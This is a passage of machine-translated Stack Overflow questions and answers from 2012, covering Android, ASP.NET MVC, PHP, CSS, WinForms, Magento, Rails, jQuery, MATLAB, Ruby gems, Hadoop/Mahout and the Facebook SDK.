但它抛出以下异常 -

```
08-01 10:59:10.478: E/MediaPlayer(4529): Unable to to create media player
08-01 10:59:16.158: W/System.err(4529): java.io.IOException: setDataSource failed.: status=0x80000000
08-01 10:59:16.166: W/System.err(4529):     at android.media.MediaPlayer.setDataSource(Native Method)
08-01 10:59:16.174: W/System.err(4529):     at android.media.MediaPlayer.setDataSource(MediaPlayer.java:745)
08-01 10:59:16.174: W/System.err(4529):     at android.media.MediaPlayer.setDataSource(MediaPlayer.java:675) 
```

我调试了 Uri 警报的代码和值是

```
content://settings/system/alarm_alert 
```

我无法弄清楚为什么它无法创建媒体播放器并抛出该异常？有人可以指出问题出在哪里。

提前致谢

# asp.net-mvc - MVC 4 的 PreserveLoginUrl 覆盖

> ID：11751730
> 
> 赞同：3
> 
> 时间：2012-08-01T02:17:55.837
> 
> 标签：asp.net-mvc

我有一个控制器操作，它从客户端上的 jquery 方法调用并返回 JSON。在某些情况下，我可能需要从此操作返回 401。只要在 web.config 中将 PreserveLoginUrl 设置为 true，如果我尝试发出 401，标准 MVC 将创建一个将用户重定向到登录页面的响应。我希望能够在某些操作上覆盖 PreserveLoginUrl，以便将真正的 401 发送到客户端。但是，对于大多数操作， PreserveLoginUrl=true 是正确的行为，所以我希望保持这种行为。

关于如何在保持 PreserveLoginUrl=true 功能的同时无需重定向少数操作的情况下完成真正的 401 的任何建议？现在，我返回 400 而不是 401 作为解决方法，但这并不是真正正确的行为，因为我确实想发出未授权。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-30T18:32:53.337

Use a 403 response instead and have your javascript/jquery method do what you want if the response is a 403\. It is extremely difficult to override the built-in behavior of a 401 response in ASP.net.

# php - 获取 PHP 联系表以工作

> ID：11751732
> 
> 赞同：0
> 
> 时间：2012-08-01T02:18:45.040
> 
> 标签：php, contact-form

我正在创建我的第一个网站。我创建了一个 PHP 联系表。现在，我的 html 和 php 文件存储在本地，我还没有虚拟主机。

单击该`Submit`按钮时，将下载 PHP 文件，而不是发送电子邮件。如何获取联系表格以发送电子邮件？在执行此操作之前，我是否需要一个网络主机？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T02:20:46.447

听起来您正在 Web 浏览器中加载 HTML 文件，当它们提交到 PHP 页面时，它会加载该页面。这是因为您需要一个 Web 服务器来实际处理 PHP 脚本。

*   如果您正在运行 Windows，则可以查看[WAMPServer](http://www.wampserver.com/en/)。

*   还有适用于 Mac 的[MAMP](http://www.mamp.info/en/index.html)。

*   以及适用于 Windows、Mac 和 Linux 的[Xampp 。](http://www.apachefriends.org/en/xampp.html)

有很多使用它们的教程，所以入门应该很容易。

# excel - 修改迭代 VBA 例程以在高性能集群上运行

> ID：11751743
> 
> 赞同：0
> 
> 时间：2012-08-01T02:20:58.720
> 
> 标签：excel, vba, hpc

我有一个 2010 Excel 64 位模型，它有一个 VBA 子例程来运行 16 种输入组合，所有这些组合都使用相同的 Excel 模型计算进行处理，然后将结果输出到模型中的选项卡。我可以访问高性能集群 (HPC) 并希望运行 VBA 代码，以便我可以并行运行 16 种组合，而不是当前在 HPC 上的顺序进程。我应该如何处理这个？例如，我是否需要将每个组合放入一个单独的子例程中并有一个主 VBA 子例程来调用每个组合？为了在 HPC 上运行模型，我需要包含前端和后端 VBA 代码吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T02:29:20.913

Excel VBA [does not directly allow](https://stackoverflow.com/questions/5721564/multi-threading-in-vba) multithreading, so unfortunately there is no simple VBA solution for this.

I can see a couple options here, and it will depend on your problem whether you will be able to use them.

1.  In Excel 2007 and 2010, worksheet functions can execute in parallel. If your VBA code is a function and not a sub, and if most of your data comes from the worksheet, you could try to take advantage of that.

2.  You could write a DLL that handles multithreading yourself, and [call it from Excel](http://msdn.microsoft.com/en-us/library/office/bb687915.aspx). For this, you'd have to port your code to VB 6 or VB.NET (or straight up rewrite it in C/C++), and manually deal with multithreading.

# visual-studio-2008 - win32应用启动调试运行良好，但启动不调试却意外退出

> ID：11751744
> 
> 赞同：1
> 
> 时间：2012-08-01T02:21:04.753
> 
> 标签：visual-studio-2008, visual-c++

在 Visual Studio 2008 中，我创建了一个 win32 应用程序。它编译和构建没有任何错误。我构建了一个发布版本，运行 Start Debugging 应用程序运行良好，没有任何异常，但是 Start Without Debugging，应用程序意外退出，当我从 Release 文件夹启动它时也退出。

那么关于如何解决这个问题的任何建议，顺便说一下，在 Win32 应用程序中启动调试和不启动调试有什么区别？

预先感谢您的任何帮助！

# html - 页脚不在页面底部

> ID：11751746
> 
> 赞同：2
> 
> 时间：2012-08-01T02:21:29.880
> 
> 标签：html, css, wordpress, footer

在我的网站上：[http](http://www.thetechnodaily.com) ://www.thetechnodaily.com主页上的页脚很好，因为内容很多。但是在内容较少的页面上，例如关于页面，它不在页面底部。页脚位于内容的末尾而不是页面的底部。有什么办法可以让页脚始终保持在底部？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T02:45:47.067

**是的，你可以使用粘性页脚**

```
 <div id="footer"></div>

#footer
        { 
        position: relative;
        margin-top: -50px; /* Give the height of footer as negative margin */
        height: 50px;
        clear:both;
        } 
```

此链接可能对您有所帮助

[http://www.cssstickyfooter.com/using-sticky-footer-code.html](http://www.cssstickyfooter.com/using-sticky-footer-code.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T02:25:32.567

如果您指的是始终显示在底部的固定页脚，您将需要使用固定位置`bottom: 0px`，这样即使内容没有填满屏幕，它也会始终保持在那里

```
 #footer_id {
      position:fixed;
      bottom:0px;
      height: "whatever";
    } 
```

# php - 替换占位符和回显内容

> ID：11751748
> 
> 赞同：-1
> 
> 时间：2012-08-01T02:21:48.963
> 
> 标签：php

我有内容变量`$number['content']`，其中有占位符`<!--email-->` ，需要用`$email`变量替换。

下面是存储在内容变量中的内容。 `<iframe src="url.com&em=<!--email-->&se=51" style="width:900px;height:700px;"></iframe>`

我需要用变量替换`$email`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T02:24:30.183

这将取代应该工作。

```
<?php 

$content = '<iframe src="url.com&em=<!--email-->&se=51" style="width:900px;height:700px;"></iframe>';

$content = str_replace('<!-- email -->', $email, $content); 
```

如果可能的话，我会建议使用[sprintf()](http://php.net/sprintf)。

```
<?php

$content = '<iframe src="url.com&em=%s&se=51" style="width:900px;height:700px;"></iframe>';

$content = sprintf($content, $email); 
```

# c# - 创建表单（没有表单设计器）

> ID：11751749
> 
> 赞同：1
> 
> 时间：2012-08-01T02:21:53.410
> 
> 标签：c#, winforms, visual-studio-2010

我有一个（我认为是）非常简单的问题，但我正在为此烦恼：

在我的主类中，在 main 方法中，我有以下代码：

```
Form window = new Form();
window.FormBorderStyle = FormBorderStyle.None;
window.BackgroundImage = blurred; //blurred is a Bitmap
window.SetBounds(bounds.X, bounds.Y, bounds.Width, bounds.Height); //bounds is a Rectangle
window.Show(); 
```

这是尝试使用背景图像制作无边框窗口。我运行代码并且没有错误 - 但没有出现任何形式。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-01T02:59:12.400

您的代码不起作用，因为您尚未启动事件循环以保持进程运行。让你的代码工作就像改变一样简单

```
Form window = new Form();
window.FormBorderStyle = FormBorderStyle.None;
window.BackgroundImage = blurred; //blurred is a Bitmap
window.SetBounds(bounds.X, bounds.Y, bounds.Width, bounds.Height); //bounds is a Rectangle
window.Show(); 
```

至

```
Form window = new Form();
window.FormBorderStyle = FormBorderStyle.None;
window.BackgroundImage = blurred; //blurred is a Bitmap
window.SetBounds(bounds.X, bounds.Y, bounds.Width, bounds.Height); //bounds is a Rectangle
Application.Run(window); 
```

添加*Application.Run*会启动一个消息处理循环，因此您的应用程序现在正在等待事件处理，直到您运行*Application.Exit*。将窗口发送到此命令可确保在您关闭表单时自动运行 exit，这样您就不会意外地让进程在后台运行。无需运行表单显示方法，因为*Application.Run*会自动为您显示。

也就是说，我仍然建议使用类似于 LarsTech 发布的方法，因为它可以解决一些额外的问题。

```
[STAThread]
static void main() 
{
   Application.EnableVisualStyles();
   Application.SetCompatibleTextRenderingDefault(false);

   Form window = new Form();
   window.StartPosition = FormStartPosition.Manual;
   window.FormBorderStyle = FormBorderStyle.None;
   window.BackgroundImage = blurred; //blurred is a Bitmap
   window.SetBounds(bounds.X, bounds.Y, bounds.Width, bounds.Height); 
   Application.Run(window);
} 
```

[STAThread] 将表单的线程模型限制为单个线程。这有助于防止一些可能破坏表单的边缘情况线程问题。

*Application.EnableVisualStyles*告诉您的应用程序默认为您的操作系统级别使用的样式。

*[自 Visual Studio 2005 以来，新表单项目中的Application.SetCompatibleTextRenderingDefault](http://msdn.microsoft.com/en-us/library/system.windows.forms.application.setcompatibletextrenderingdefault.aspx)*已默认为 false。您应该没有理由更改它，因为您显然是在进行新的开发。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-01T02:24:35.377

确保您有一个消息泵正在运行。

就像是：

```
[STAThread]
static void Main() {
  Application.EnableVisualStyles();
  Application.SetCompatibleTextRenderingDefault(false);

  Form window = new Form();
  window.StartPosition = FormStartPosition.Manual;
  window.FormBorderStyle = FormBorderStyle.None;
  window.BackgroundImage = blurred;
  window.SetBounds(bounds.X, bounds.Y, bounds.Width, bounds.Height); 
  Application.Run(window);
} 
```

要确保的另一件事是您的`bounds`矩形实际上在屏幕尺寸内。

# magento - Magento - 限制特定页面上返回的产品数量？

> ID：11751750
> 
> 赞同：0
> 
> 时间：2012-08-01T02:21:54.297
> 
> 标签：magento, magento-1.6

我有一些从这个页面链接到的特定页面 - [http://www.formagdev1.com/shop-online.html](http://www.formagdev1.com/shop-online.html)

页面顶部、商店新用户和客户收藏都链接到自定义页面，但我们希望限制这些页面上显示的产品数量。独占很好，它可以像当前一样返回带有分页的页面。

因此，如果您单击 New to the store，您将进入一个页面，该页面转储包含所有带分页产品的数组。我想将此页面上的产品数量限制为 25 个，没有分页。与客户收藏页面相同。

我只使用网格模式，我当前构建数组的代码是 -

```
 <?php $_collectionSize = $_productCollection->count();  ?>
<?php $_columnCount = $this->getColumnCount(); ?>
<?php $i=0; foreach ($_productCollection as $_product): ?>
    <?php if ($i++%$_columnCount==0): ?>
    <ul class="products-grid">
    <?php endif ?> 
```

我遇到的问题是，如果我只是从自定义页面中删除顶部和底部的工具栏，它会从所有网格类型页面列表中删除它，所以在这种情况下的简单想法似乎不起作用。

有没有办法将这 2 个特定页面显示的产品数量限制为 25 个，并且没有分页？

有任何想法吗？

谢谢！账单

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T04:27:54.650

尝试使用以下命令限制 $collection：

```
->setPage(1, 25) 
```

但仅在集合尚未初始化时才有效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-03T20:08:46.753

Thanks for the suggestions everyone. I ended up just doing this using XML in the deisng of the page, workes as I need it to now :-)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-01T09:28:18.717

`Mage_Catalog_Block_Product_List`是处理列表显示的块。您可以在此处添加一个函数来定义这是否为无分页类别，例如`function isNoPagination()`. 然后，您可以编辑 catalog/product/list.phtml 模板以仅在 when 显示工具栏`!$this->isNoPagination()`并将 max collection size 设置为 25 when `!$this->isNoPagination()`。

函数 isNoPagination 可以基于例如 getLayer()->getCategoryId()。

# ruby - Array:Class，部分视图的未定义方法“model_name”

> ID：11751751
> 
> 赞同：0
> 
> 时间：2012-08-01T02:21:57.470
> 
> 标签：ruby, ruby-on-rails-3.1, partial-views

我正在使用不工作的局部视图，在 review#new 操作中，我有一个 from 并且我正在调用 post partial view ：

```
<%= form_for @review do |f| %>

    <div>
    <%= field_with_error @review, :content do %>
    <%= f.label :content %><br />
    <%= f.text_area :content %>
    <% end -%>
    </div>

    <%= field_with_error @review, :score do %>
    <%= f.label :score %>
    <%= f.text_field :score %>
    <% end -%>

   <p><%= submit_tag 'Post Review'%> </p>
  <% end %>
     </div>

    <ul >
     <%= render :partial => "post", :locals => {:review =>  @reviews}  %>
   </ul> 
```

在评论中#新控制器：

```
 def new
      @review = Review.new(:restaurant_id => params[:restaurant_id])   
      @reviews = Review.all
  end 
```

和 review#_post 看起来像：

```
<%= content_tag_for(:li, review) do %>
  <p ><%= "#{review.first_name}" %></p>
  <p ><%= review.content %></p>
  <span >Posted at <%= review.created_at %> ago.
  (<%= link_to 'Delete', post, :confirm => 'Are you sure?', :method => :delete %>)</span>
<% end %> 
```

它给出了一个错误：

```
undefined method `model_name' for Array:Class 
```

我认为我对部分观点做错了，提前谢谢你:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T02:41:36.097

在您看来，您有：

```
<ul >
  <%= render :partial => "post", :locals => {:review =>  @reviews}  %>
</ul> 
```

你在`@reviews`这里传递的是一个数组，而不是模型`@review`。删除此处`s`末尾的`@reviews`，它应该可以工作。:)

编辑：如果你想呈现所有评论的列表`@reviews`，你可以这样做：

```
<ul >
  <%= render :partial => "post", :collection => @reviews  %>
</ul> 
```

查看有关部分的[文档以](http://guides.rubyonrails.org/layouts_and_rendering.html#using-partials)获取有关如何执行此操作的更多选项。

# jquery - jquery validate - 单击“提交”检查一个复选框

> ID：11751755
> 
> 赞同：0
> 
> 时间：2012-08-01T02:22:32.167
> 
> 标签：jquery, ajax, forms

我有一个验证表单（使用[jQuery Validate](http://docs.jquery.com/Plugins/Validation)）然后提交数据的脚本。它目前运行良好，但现在我需要添加一个复选框，我不清楚如何使用 jquery/ajax 提交值。我需要包括类似的东西`$('#checkBox').attr('checked');`吗？如果是这样，我如何将它传递给ajax？

此外，当我单击“提交”时，未完成表单，复选框会自动检查。为什么会这样？

jQuery：

```
<script>
$(document).ready(function(){
    $("#formid").validate({
        rules: {
            name: "required",
            email: {
                required:   true,
                email:      true
            },
            mobile: {
                required:   true,
                minlength:  10
            },
            news: {
                required:   false,
            }
        },
        messages: {
            name:   "Please enter your name",
            email:  "Please enter a valid email address",
            mobile: "Please enter your mobile number"
        },
        submitHandler: function() {
                var name        = $('#name').attr('value');
                var email       = $('#email').attr('value'); 
                var mobile      = $('#mobile').attr('value');
                var news        = $('#news').attr('value');

                $.ajax({
                    type: "POST",
                    url: "ajax.php",
                    data: $("#formid").serialize(),
                    success: function(){
                        $('form#formid').hide();
                        $('div.success').fadeIn();
                    }
                });
            return false;
        }
    });
});
</script> 
```

形式：

```
<form id="formid" method="post">
    <fieldset>
        <div>
            <label for="name">Name</label>
            <input type="text" id="name" name="name" class="required"  />
        </div>

        <div>
            <label for="email">Email</label>
            <input type="text" id="email" name="email" class="required" />
        </div>

        <div>
            <label for="mobile">Mobile</label>
            <input type="text" id="mobile" name="mobile" class="required" />
        </div>
        <label for="news"><p>Please don&rsquo;t send me ongoing news</p>
        <input type="checkbox" id="news" name="news" value="No" />

    <label for="submit1" id="submit"><span>&nbsp;</span>
        <input id="submit1" type="submit" name="submit" value="Submit"/>
        </label>
    </fieldset>
</form> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T02:28:02.537

您有一个未关闭的`label`标签，浏览器正在扩展该标签以包含 the`checkbox`和`submit`button。

```
<label for="news">
    <p>Please don&rsquo;t send me ongoing news</p>
    <input type="checkbox" id="news" name="news" value="No" />
<!-- should close news label here -->    
<label for="submit1" id="submit">
    <span>&nbsp;</span>
    <input id="submit1" type="submit" name="submit" value="Submit"/>
</label> 
```

这会导致`checkbox`和`submit`在其中任何一个被点击时都表现得好像被点击了一样。

修复您的标记应该可以解决您的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T02:27:42.093

这之前已在[此处](https://stackoverflow.com/a/3933266/214747)讨论过。[该演示](http://jquery.bassistance.de/validate/demo/)的链接也应该有所帮助。

请注意，如果选中，jquery serialize 只会包含复选框值。

# matlab - MatLab中如何证明一个数是整数的倍数？

> ID：11751760
> 
> 赞同：1
> 
> 时间：2012-08-01T02:22:58.423
> 
> 标签：matlab

如果一个数字确实是整数的倍数或可整除，我们如何证明一个数字，而不在 MATLAB 中使用 mod() 和 -rem()？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T03:09:26.870

使用[`ROUND`](http://www.mathworks.com/help/techdoc/ref/round.html)：

```
% To determine if i0 is a multiple of i1:
is_multiple = ( i1 * round(double(i0)/i1) == i0 ); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T02:53:01.937

使用`factor`，如果结果只是 1 和原始数字，那么它是一个素数。

或者干脆使用`isprime`

# gem - Eventmachine gem 权限被拒绝

> ID：11751761
> 
> 赞同：0
> 
> 时间：2012-08-01T02:23:06.850
> 
> 标签：gem, nokogiri, eventmachine

我正在尝试运行

```
$gem install eventmachine -v '0.12.10' 
```

因为跑步的时候

```
$bundle install 
```

在我的 rails 应用程序中，当它到达 eventmachine 时，我收到此错误：

```
Installing eventmachine (0.12.10) 
Errno::EACCES: Permission denied - /Users/pippinlee/.rvm/gems/ruby-1.9.3-p194/gems/eventmachine-0.12.10/.gitignore
An error occured while installing eventmachine (0.12.10), and Bundler cannot continue.
Make sure that `gem install eventmachine -v '0.12.10'` succeeds before bundling. 
```

我尝试将 gem 'eventmachine', '~> 0.12.10' 添加到 Gemfile。

根据这些 ( [http://nokogiri.org/tutorials/installing_nokogiri.html](http://nokogiri.org/tutorials/installing_nokogiri.html) ) Nokogiri 说明，我已经用 brew 安装了 libxml2、libxslt、libiconv-1.13.1 文件。

使用 -pre （以及 Gemfile 中的相应锁）进行安装也没有不同的结果。

**正在运行：Lion、Xcode 4.3.2、rvm 1.14.10、ruby 1.9.3p194、rails（3.2.7、3.2.0）**

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-19T16:30:23.467

也许蛮力方法可能有效：

```
sudo chown -R pippinlee:staff /Users/pippinlee/.rvm 
```

我的猜测是你做了一些事情，比如安装另一个 gem，意外地以 root 用户身份运行。

# rest - 识别资源的多个标识符是 RESTful 吗？

> ID：11751762
> 
> 赞同：1
> 
> 时间：2012-08-01T02:23:11.247
> 
> 标签：rest, uri, hateoas

如果`http://example.com/foo`和`http://example.com/bar`都代表相同的资源并且服务器不区分两者怎么办？如果它在形成应用程序状态引擎（遵循 HATEOAS）的文档中互换使用它们，以便`/bar`在某些上下文和`/foo`其他上下文中显示，会怎样？

这是 RESTful 吗？

这样做的一个潜在好处是将描述符附加到 URI，例如`http://example.com/article/30204/The-Quick-Brown-Fox`，为了书签、搜索引擎查询，以及一般来说，人们可能通过查看 URI 来识别它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T15:06:56.203

从 REST 的角度来看，一个资源具有多个 URI 是完全可以接受的，只要这些 URI 是通过遵循应用程序发布的入口点的超媒体控件来发现的。但是，我建议不要这样做。拥有多个 URI 意味着一些缓存命中现在将是未命中的，并且您可能会混淆人们，因为不清楚这两个 URI 是否导致相同的资源或两个非常相似的不同资源。

# hadoop - mahout 不会启动。hadoop和mahout之间的兼容版本有什么关系吗？

> ID：11751763
> 
> 赞同：1
> 
> 时间：2012-08-01T02:23:28.387
> 
> 标签：hadoop, mahout

我是hadoop的新手，而不是说mahout。我希望有人可以帮助我通过这里..已经尝试了 2 天..
我已经运行了一个 hadoop 集群。
我正在使用 hadoop-2.0.0-alpha。
我安装了 mahout (ahout-distribution-0.7) 和 maven-2.2.1 (最新的 maven-3.0.4 不起作用)

现在我想运行 mahout 来了解它是什么。
我了解到，通过输入“mahout”，它会打印出 mahout 中可用的选项（算法）列表，但是当我输入 mahout 时，它只会给我 Java 异常。

```
$ [hadoop@localhost bin]$ mahout
MAHOUT_LOCAL is not set; adding HADOOP_CONF_DIR to classpath.
Running on hadoop, using /home/hadoop/hadoop/bin/hadoop and HADOOP_CONF_DIR=/home/hadoop/hadoop/conf
MAHOUT-JOB: /home/hadoop/mahout/examples/target/mahout-examples-0.7-job.jar
Exception in thread "main" java.lang.NoSuchMethodError: org.apache.hadoop.util.ProgramDriver.driver([Ljava/lang/String;)V
    at org.apache.mahout.driver.MahoutDriver.main(MahoutDriver.java:123)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:616)
    at org.apache.hadoop.util.RunJar.main(RunJar.java:208) 
```

根据我在网上搜索的内容，大多数答案都要求我使用较低版本的 hadoop，即 hadoop-0.20，我现在的问题是否与我的 hadoop 版本有关？
谢谢你。

*======== 新编辑 ========*

我将 hadoop 版本更改为 hadoop-1.0.3，现在当我输入“mahout”时它可以工作（我的 mahout 是 version7）

但是当我尝试运行一个示例时，它再次失败并出现类似的错误。

```
$ hadoop /home/hadoop/mahout/core/target/mahout-core-0.7-job.jar org.apache.mahout.cf.taste.hadoop.item.RecommenderJob -Dmapred.output.dir=output  -Dmapred.input.dir=input/prefs.txt  --usersFile input/users.txt --similarityClassname SIMILARITY_PEARSON_CORRELATION
Caused by: java.lang.ClassNotFoundException: .home.hadoop.mahout.core.target.mahout-core-0.7-job.jar
    at java.net.URLClassLoader$1.run(URLClassLoader.java:217)
    at java.security.AccessController.doPrivileged(Native Method)
    at java.net.URLClassLoader.findClass(URLClassLoader.java:205)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:321)
    at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:294)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:266)
Could not find the main class: /home/hadoop/mahout/core/target/mahout-core-0.7-job.jar. Program will exit. 
```

唔..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T04:30:05.817

是的，如果你想让它工作，看起来你需要使用不同版本的 Hadoop（或从源代码构建最新的 Mahout）。你得到一个*NoSuchMethodError*所以首先要做的是检查*ProgramDriver*是否在你正在使用的 hadoop 的分发中。

查看各种版本的 API 文档，您可以看到它在 v0.0.20.x 中，但已从较新版本中删除。

*   [http://hadoop.apache.org/common/docs/r0.20.205.0/api/index.html](http://hadoop.apache.org/common/docs/r0.20.205.0/api/index.html)
*   [http://hadoop.apache.org/common/docs/r2.0.0-alpha/api/index.html](http://hadoop.apache.org/common/docs/r2.0.0-alpha/api/index.html)（你的版本）

查看 Mahout 的 JIRA，您可以看到在 7 月 11 日提交了一个与此问题类似的错误，并已在 0.8 版中修复。

*   [MAHOUT-1044] [https://issues.apache.org/jira/browse/MAHOUT-1044](https://issues.apache.org/jira/browse/MAHOUT-1044)

**更新：**

你的命令不应该在 hadoop 命令之后有**jar吗？**就像是：

> $ hadoop jar /home/hadoop/mahout/core/target/mahout-core-0.7-job.jar 等

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:56:46.127

@BinaryNerd 是对的。Mahout 中有一个错误，详见：

*   [MAHOUT-1044] [https://issues.apache.org/jira/browse/MAHOUT-1044](https://issues.apache.org/jira/browse/MAHOUT-1044)

Mahout 0.7 命令行给出了 NoClassDef ProgramDriver 错误，如问题第一部分所述。这将在 0.8 中修复，或者您可以按照错误报告中的详细说明编辑您的 bin/mahout 以修复支撑位置。

我在 Cloudera CDH 4.1.2 下使用 mahout 遇到了同样的问题。更换我的 bin/mahout 中的支架修复了它。

# php - PHP/MySQL 和状态

> ID：11751764
> 
> 赞同：0
> 
> 时间：2012-08-01T02:23:40.353
> 
> 标签：php, http, codeigniter

我正在制作一个 PHP 和 MySQL（和 CodeIgniter）视频/聊天程序，它**1）**显示当前在线用户，以及**2）**在主持人离开时强制所有用户断开连接。

但是 HTTP 是无状态的。实现上述功能的最佳方法是什么？

我应该为每个用户使用心跳 AJAX 请求来确定当前状态吗？我如何知道用户（例如版主）是否断开连接？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T02:32:48.443

This would require a close to real-time implementation. You could have a table that has all the rooms / chat sessions created. Then in your users table you could have a moderators column as well as a current room id column.

## **Rooms Table**

## Columns: ID, USER_ID, CREATED_AT, UPDATED_AT, NAME, PASSWORD, HAS_MODERATOR (bool) ....

When a moderator joins a room, you could update the "HAS_MODERATOR" field to true or 1\. Then you could write a simple long-polling script that would simply make an ajax request to a php page or route and return a value of true or false. If it returns true, then a moderator is still in the room, otherwise you can close the room and force a redirect through javascript or something. The php script would simply check if has_moderator is true, AND you would go through the users table, retrieve all the moderators, and check what room they are in. Match the current room the moderator is in with the room your checking for. This will ensure that a moderator is in the room.

This might help you out: [Notify Ajax/Javascript that background PHP has completed](https://stackoverflow.com/questions/11751459/notify-ajax-javascript-that-background-php-has-completed/11751523#11751523)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T06:14:48.623

我认为您可以在不使用 HTTP 的状态逻辑的情况下实现它。您将需要在数据库中存储当前的对话状态。每个用户请求都将有一个经过身份验证的用户名 cookie 和一个会话 ID，用于从后端数据库中提取会话。此外，将有一个变量来检查主持人是否存在（heartbit 样式检查）。当主持人离开时，只需更改会话状态即可让所有其他人退出。如果您需要我建议的任何步骤的任何详细信息，请告诉我。

# android - 关于 Android 上的 Facebook 登录

> ID：11751771
> 
> 赞同：0
> 
> 时间：2012-08-01T02:24:41.697
> 
> 标签：android, facebook

我注意到有些游戏使用 Facebook SDK 登录他们的游戏。我第一次登录时，它会显示一个登录表单并转到他们的应用程序。注销并再次登录后，它不再显示 Facebook 登录表单。如果我想用另一个 Facebook 帐户登录，我必须使用 Facebook 应用程序。为什么？为什么游戏的注销按钮也无法注销Facebook？这是一个正确的机制吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T04:40:46.277

打开由 facebook sdk 提供的 Facebook.java，然后我进行了如下更改：

```
public void authorize(Activity activity, String[] permissions,
            int activityCode, final DialogListener listener) {

        boolean singleSignOnStarted = false;

        mAuthDialogListener = listener;

      /*  // Prefer single sign-on, where available.
        if (activityCode >= 0) {
            singleSignOnStarted = startSingleSignOn(activity, mAppId,
                    permissions, activityCode);
        }
        // Otherwise fall back to traditional dialog.
        if (!singleSignOnStarted) {*/
            startDialogAuth(activity, permissions);
       // }
    } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-01T05:36:15.023

使用以下代码进行注销：

```
private void logout(Facebook facebook) {
    AsyncFacebookRunner mAsyncRunner = new AsyncFacebookRunner(facebook);
    mAsyncRunner.logout(getBaseContext(), new RequestListener() {
        @Override
        public void onComplete(String response, Object state) {
            Log.i("System out", "Logout:onComplete:res:state " + response
                    + ":" + state);
            new LoginData(SettingsActivity.this).clearFacebookDataInPref();
            handler.sendEmptyMessage(1);
        }

        @Override
        public void onIOException(IOException e, Object state) {
            Log.i("System out", "Logout:state" + ":" + state);
            e.printStackTrace();
            exceptionMessage = e.getMessage();
            handler.sendEmptyMessage(2);
        }

        @Override
        public void onFileNotFoundException(FileNotFoundException e,
                Object state) {
            Log.i("System out", "Logout:OnFileNotFoundExce:state:" + state);
            e.printStackTrace();
            exceptionMessage = e.getMessage();
            handler.sendEmptyMessage(2);
        }

        @Override
        public void onMalformedURLException(MalformedURLException e,
                Object state) {
            Log.i("System out", "Logout:MalformedURLExce:state:" + state);
            e.printStackTrace();
            exceptionMessage = e.getMessage();
            handler.sendEmptyMessage(2);
        }

        @Override
        public void onFacebookError(FacebookError e, Object state) {
            Log.i("System out", "Logout:onFacebookError:state" + state);
            e.printStackTrace();
            exceptionMessage = e.getMessage();
            handler.sendEmptyMessage(2);
        }
    });
} 
```

如果您保存访问令牌并在共享首选项上过期，请在 onComplete 侦听器上删除/清除..

# jquery - 如果有子 ul，则将类添加到 li

> ID：11751773
> 
> 赞同：1
> 
> 时间：2012-08-01T02:25:22.723
> 
> 标签：jquery

我有一个看起来像这样的菜单项。

```
<ul>
<li><a href="id=1">HOME</a></li>
<li><a href="id=2">News</a>
    <ul>
        <li><a href="id=3">News Archive</a></li>
    </ul>
</li>
</ul> 
```

我希望它看起来像这样

```
<ul>
<li><a href="id=1">HOME</a></li>
<li class="hassub"><a href="id=2">News</a>
    <ul>
        <li><a href="id=3">News Archive</a></li>
    </ul>
</li>
</ul> 
```

因此，如果 li 有一个孩子，那么它将有一个 hassub 类。

我试过用 jQuery 添加这个，[见 fiddle](http://jsfiddle.net/aaronk85/fNrQE/)。但它正在将类添加到所有 ul li。我哪里错了？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-01T02:29:01.410

试试[.has](http://api.jquery.com/has/)

```
$('ul li').has('ul').addClass('hassub'); 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-08-01T02:33:31.593

试试这个并只使用一个`$(selector)`：

```
$('ul li:has(ul)').addClass('hassub'); 
```

**现场演示：**

[http://jsfiddle.net/oscarj24/fNrQE/2/](http://jsfiddle.net/oscarj24/fNrQE/2/)

​</p>

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-12-07T09:03:46.260

您无需检查 ul 是否存在即可将类添加到父 li，您只需在 jQuery 选择器中定位子 ul。这是一个例子：

```
// Add Class to LI with Child UL (Level 1)
$('.menuDiv li ul').parent().addClass('hasChild'); 
```

如果没有找到ul，代码不会触发。将类添加到所有列表项后，您可以使用 > 选择器仅定位第一个子锚点（如果需要）：

```
.menuDiv li.hasChild > a 
```

...或`<ul>`以 li 父类为目标：

```
.menuDiv li.hasChild ul 
```

* * *

您可以查看下面的链接以查看实时示例（也包含 2 级列表）以及有关代码的更多详细信息：

[http://html-tuts.com/add-class-to-parent-li-if-has-child-ul/](http://html-tuts.com/add-class-to-parent-li-if-has-child-ul/)

# opencv - 在 C++ 中使用 OpenCV 计算仿射运动模型系数

> ID：11751779
> 
> 赞同：1
> 
> 时间：2012-08-01T02:25:51.537
> 
